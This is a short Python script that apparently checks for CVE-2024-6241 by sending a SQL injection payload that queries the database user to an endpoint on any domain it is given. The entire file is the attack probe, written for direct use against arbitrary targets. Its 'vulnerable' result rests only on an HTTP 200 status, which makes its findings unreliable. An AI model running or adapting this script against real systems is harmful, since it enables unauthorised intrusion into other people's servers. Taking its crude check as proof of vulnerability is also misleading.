import requests
import datetime

class cve_2024_6241():
	def sql_injection(self, domain):
		payload = '/system/dictData/getDictItems/gen_table,user(),1,1'
		url = 'https://'+domain+payload
		access_endpoint = requests.post(url, allow_redirects=True)
		time = datetime.datetime.now()
		if access_endpoint.status_code == 200 : return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-6241 : vulnerable'
		else : return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-6241 : not vulnerable'
